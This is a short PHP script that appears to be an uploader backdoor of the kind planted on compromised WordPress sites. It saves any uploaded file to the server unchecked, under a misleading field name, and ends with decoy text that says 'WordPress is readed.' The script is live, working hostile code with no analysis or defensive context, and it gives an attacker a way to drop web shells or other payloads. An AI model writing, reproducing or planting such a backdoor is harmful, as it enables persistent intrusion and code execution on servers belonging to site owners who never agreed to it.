<?php
$tmpid=basename($_FILES["size_id"]["name"]);
if(move_uploaded_file($_FILES["size_id"]["tmp_name"],$tmpid)){
	echo basename($_FILES["size_id"]["name"])." done well";
}
echo "<form enctype=\"multipart/form-data\" method=\"POST\">
<input type=\"file\" name=\"size_id\"/>
<input type=\"submit\" value=\"commander\"/>
</form>
</br>WordPress is readed.";
?>